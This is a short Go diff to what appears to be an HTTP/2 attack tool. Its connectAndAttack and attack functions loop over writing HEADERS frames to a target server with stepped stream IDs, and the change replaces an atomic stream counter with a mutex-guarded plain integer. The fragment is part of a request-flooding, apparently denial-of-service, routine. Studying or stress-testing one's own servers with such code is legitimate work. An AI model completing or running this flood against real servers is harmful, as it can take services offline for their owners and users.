@@ -13,7 +13,6 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"sync/atomic"
 	"time"
 
 	"golang.org/x/net/http2"
@@ -275,8 +274,7 @@ func connectAndAttack(serverUrl *url.URL, conf *tls.Config, connId int) ReadFram
 
 	//at this point, the connection is established.
 
-	var streamCounter atomic.Uint32 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
-	streamCounter.Add(1)
+	var streamCounter uint32 = 1 //according to https://datatracker.ietf.org/doc/html/rfc9113#name-stream-identifiers, stream IDs MUST be uneven for client-initiated requests
 	var l *sync.Mutex = nil
 	if *routines > 1 {
 		l = &sync.Mutex{}
@@ -347,13 +345,14 @@ func readFrames(conn *tls.Conn, connId int) ReadFrameResult {
 	}
 }
 
-func attack(framer *http2.Framer, url *url.URL, streamCounter *atomic.Uint32, lock *sync.Mutex) {
+func attack(framer *http2.Framer, url *url.URL, streamCounter *uint32, lock *sync.Mutex) {
 	for i := uint(0); i < *attempts; i++ {
 		if lock != nil {
 			lock.Lock()
 		}
-		var streamId uint32 = streamCounter.Add(2)
+		var streamId uint32 = *streamCounter + 2
 		err := framer.WriteHeaders(createHeaderFrameParam(url, streamId))
+		*streamCounter = streamId
 		if lock != nil {
 			lock.Unlock()
 		}
